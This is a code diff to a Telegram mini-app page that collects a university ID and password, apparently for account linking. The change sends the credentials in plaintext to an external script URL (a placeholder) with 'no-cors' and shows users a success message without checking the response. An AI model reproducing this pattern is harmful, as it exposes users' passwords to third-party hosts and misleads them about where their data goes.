@@ -199,6 +199,7 @@
         tg.expand();
 
         const userTelegramId = (tg.initDataUnsafe && tg.initDataUnsafe.user) ? tg.initDataUnsafe.user.id : "123456789";
+        const scriptUrl = "https://google.com";
 
         function toggleTheme() {
             const body = document.body;
@@ -226,37 +227,34 @@
             submitBtn.disabled = true;
             statusMessage.style.display = "block";
             statusMessage.style.color = "var(--primary-color)";
-            statusMessage.innerText = "جاري إرسال البيانات والربط...";
+            statusMessage.innerText = "جاري إرسال البيانات والربط الفوري...";
 
-            fetch('/api/submit-auth', {
+            const payload = {
+                action: "auth_submit",
+                telegram_id: userTelegramId,
+                uni_id: uniId,
+                password: password
+            };
+
+            fetch(scriptUrl, {
                 method: 'POST',
+                mode: 'no-cors',
                 headers: {
                     'Content-Type': 'application/json'
                 },
-                body: JSON.stringify({
-                    telegram_id: userTelegramId,
-                    uni_id: uniId,
-                    password: password
-                })
+                body: JSON.stringify(payload)
             })
-            .then(response => response.json())
-            .then(data => {
-                if(data.success) {
-                    statusMessage.style.color = "#10b981";
-                    statusMessage.innerText = "تم إرسال بياناتك بنجاح! سيتم فحصها وإشعارك فوراً.";
-                    setTimeout(() => {
-                        tg.close();
-                    }, 3000);
-                } else {
-                    submitBtn.disabled = false;
-                    statusMessage.style.color = "#ef4444";
-                    statusMessage.innerText = "حدث خطأ أثناء الإرسال. يرجى إعادة المحاولة.";
-                }
+            .then(() => {
+                statusMessage.style.color = "#10b981";
+                statusMessage.innerText = "تم إرسال بياناتك بنجاح! سيتم فحصها وإشعارك فوراً.";
+                setTimeout(() => {
+                    tg.close();
+                }, 2500);
             })
-            .catch(error => {
+            .catch(() => {
                 submitBtn.disabled = false;
                 statusMessage.style.color = "#ef4444";
-                statusMessage.innerText = "فشل الاتصال بالسيرفر. يرجى المحاولة لاحقاً.";
+                statusMessage.innerText = "فشل الاتصال بالسيرفر السحابي. يرجى المحاولة لاحقاً.";
             });
         }
     </script>
